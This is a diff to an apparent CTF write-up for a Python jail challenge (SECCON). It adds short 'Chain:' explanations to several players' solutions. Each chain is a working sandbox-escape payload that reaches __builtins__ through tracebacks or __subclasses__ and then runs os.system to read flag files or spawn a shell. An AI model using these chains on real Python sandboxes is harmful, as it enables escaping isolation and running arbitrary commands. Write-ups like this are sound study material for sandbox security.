@@ -259,6 +259,8 @@ Idea: use `\x2e` + `format` to bypass the limitation, use `AttributeError` to sa
 
 @HexF:
 
+Chain: `ex.__traceback__.tb_frame.f_globals["__builtins__"].exec('ex.__traceback__.tb_frame.f_globals["__builtins__"].__import__("os").system("cat /flag*")')`
+
 ```python
 x
 '{0\x2e__traceback__\x2etb_frame\x2ef_globals[__builtins__]\x2eexec\x2ea}'.format(ex)
@@ -266,6 +268,8 @@ ex.obj('\x65\x78\x2e\x5f\x5f\x74\x72\x61\x63\x65\x62\x61\x63\x6b\x5f\x5f\x2e\x74
 ```
 
 @Peter:
+
+Chain: `ex.__traceback__.tb_frame.f_builtins["__import__"]("os").system("cat /flag-*")`
 
 ```python
 1/0
@@ -277,6 +281,8 @@ ex.obj('cat /flag-*')
 ```
 
 @nikost:
+
+Chain: `ex.__class__.__mro__[4].__subclasses__()[os_wrap_index].__init__.__builtins__["__import__"]("os").system("/bin/bash")`
 
 ```python
 1/0
@@ -291,12 +297,16 @@ cat ../flag*
 
 @D1N0:
 
+Reuse `.__getattribute__` using list comprehension, chain: `ex.__traceback__.tb_frame.f_builtins["eval"]("ex.__traceback__.tb_frame.f_builtins['__import__']('os').system('cat /flag*')")`
+
 ```python
 1/0
 [[[ex:=[ex["eval"] if idx=="d" else ex.__getattribute__][0](x)][0] for x in ["__traceback__" if idx == "a" else "tb_frame" if idx=="b" else "f_builtins" if idx=="c" else "ex['__import__']\x28'os'\x29\x2esystem\x28'cat /flag*'\x29"]][0] for idx in "abcd"]
 ```
 
 A similar solution to mime by @huongnoi100%:
+
+Chain: `ex.__traceback__.tb_frame.f_globals["__builtins__"].__import__("os").system("cat /flag-*")`
 
 ```python
 jail> {}[lambda d:[*d][0].__getattribute__(d[[*d][0]]),0]
@@ -314,6 +324,8 @@ jail> jail> jail> jail> jail> jail> jail> jail> SECCON{Pyth0n_was_m4de_for_jail_
 @golden:
 
 Save the previous `ex` into `ex.args` and recover it:
+
+Chain: `''.__class__.__base__.__subclasses__()[os_wrap_index].__init__.__globals__["sys"].modules["os"].system("sh")`
 
 ```python
 {}[lambda f: ''.__class__,ex]
